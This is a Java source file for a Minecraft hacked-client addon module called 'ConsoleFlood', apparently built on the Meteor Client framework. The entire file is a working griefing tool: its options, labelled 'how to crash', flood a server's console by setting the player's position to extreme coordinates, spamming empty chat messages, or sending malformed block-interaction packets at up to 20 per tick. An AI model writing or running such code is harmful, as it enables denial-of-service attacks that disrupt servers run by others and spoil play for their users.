package uwu.taxevasion.allahhack.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import uwu.taxevasion.allahhack.Allah;

public class ConsoleFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("how to crash")
        .defaultValue(Modes.Movement)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("packets/tick")
        .defaultValue(1)
        .sliderRange(1, 20)
        .build());

    public ConsoleFlood() {
        super(Allah.CATEGORY, "console-flood", "floods the console (sequence only works on vanilla/spigot)");
    }

    int timer = 0;

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case Movement -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.setPos(1333333337, 1333333337, 1333333337);
                }
            }
            case Chat -> {
                if (mc.player.hasPermissionLevel(4)) {
                    for (int i = 0; i < amount.get(); i++) {
                        mc.player.sendChatMessage("");
                    }
                } else {
                    timer++;
                    if (timer == 11) {
                        mc.player.sendChatMessage("");
                        timer = 0;
                    }
                }
            }
            case Sequence -> {
                Vec3d asdf = mc.crosshairTarget.getPos();
                for (int i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(asdf, Direction.DOWN, new BlockPos(asdf), false), -1));
                }
            }
        }
    }
    public enum Modes {
        Movement, Chat, Sequence
    }
}
